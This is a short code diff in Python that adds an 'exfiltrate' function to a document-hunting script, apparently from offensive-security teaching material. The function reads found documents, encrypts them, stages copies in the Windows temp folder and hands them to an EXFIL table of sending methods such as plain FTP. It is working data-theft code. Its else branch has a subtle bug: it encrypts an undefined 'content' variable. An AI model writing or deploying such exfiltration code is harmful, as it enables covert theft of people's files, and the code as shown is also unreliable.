@@ -24,3 +24,19 @@ def find_docs(doc_type='pdf'):
                 yield document_path
                 # if PDF, get path and yield back to caller
 
+def exfiltrate(document_path, method):
+    if method in['transmit', 'plain_ftp']:
+        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
+        with open(document_path, 'rb') as f0:
+            content = f0.read()
+        with open(filename, 'wb') as f1:
+            f1.write(encrypt(content))
+        
+        EXFIL[method](filename)
+        os.unlink(filename)
+    else:
+        with open(document_path, 'rb') as f:
+            contents = f.read()
+        title = os.path.basename(document_path)
+        content =  encrypt(content)
+        EXFIL[method](title, content)
